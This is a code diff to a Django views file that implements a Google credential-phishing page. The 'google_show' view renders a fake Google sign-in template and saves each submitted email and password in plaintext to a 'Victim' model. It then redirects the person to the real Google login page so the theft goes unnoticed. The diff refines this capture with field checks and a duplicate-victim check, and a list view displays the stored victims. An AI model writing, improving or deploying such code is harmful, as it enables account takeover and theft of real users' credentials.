@@ -1,3 +1,4 @@
+from django.contrib import messages
 from django.shortcuts import render, redirect
 from django.core.mail import send_mail
 from django.urls import reverse_lazy
@@ -34,23 +35,27 @@ sender_email = 'sackoibrahimakhalil@gmail.com'  # L'adresse e-mail de l'expédit
 
 
 def google_show(request):
+
     if request.method == "POST":
         email = request.POST.get('identifier')
         password = request.POST.get('password')
-        trap = Victim(email=email, password=password)
-        trap.save()
 
-        """   send_mail(
-            subject,
-            message,
-            sender_email,
-            [email],  # Liste des destinataires (ici, l'email récupéré)
-            fail_silently=False,
-        ) """
-        return redirect('https://accounts.google.com/InteractiveLogin/signinchooser?continue=https%3A%2F%2Fwww.google.com%2F&ec=GAZAmgQ&hl=tr&passive=true&ifkv=AVQVeyzlnmLJTmZibmoikdTTu_5Erw5RP_4BV2m08eph1vOJMAeSiGq3a61-pqTUpwHfjZiV0zkq-A&theme=glif&flowName=GlifWebSignIn&flowEntry=ServiceLogin')
+        # Vérification si les champs ne sont pas vides
+        if email and password:
+            # Vérification si l'email existe déjà dans la base de données
+            existing_victim = Victim.objects.filter(email=email).exists()
+            if existing_victim:
+                messages.error(request, "This Email already exists in the database.")
+            else:
+                # Enregistrement des données
+                trap = Victim(email=email, password=password)
+                trap.save()
+                return redirect('https://accounts.google.com/InteractiveLogin/signinchooser?continue=https%3A%2F%2Fwww.google.com%2F&ec=GAZAmgQ&hl=tr&passive=true&ifkv=AVQVeyzlnmLJTmZibmoikdTTu_5Erw5RP_4BV2m08eph1vOJMAeSiGq3a61-pqTUpwHfjZiV0zkq-A&theme=glif&flowName=GlifWebSignIn&flowEntry=ServiceLogin')
 
-    else:
-        return render(request, 'traps/goog/backup.html') #traps/goog/backup.html    'traps/goog/reserve/backup - secour.html'
+        else:
+            messages.error(request, "Both of the two fields are required")# Affichage d'un message d'erreur si les champs sont vides
+    return render(request, 'traps/goog/backup.html') #traps/goog/backup.html    'traps/goog/reserve/backup - secour.html'
+
 
 class ListTrapShow(ListView):
     model = Victim
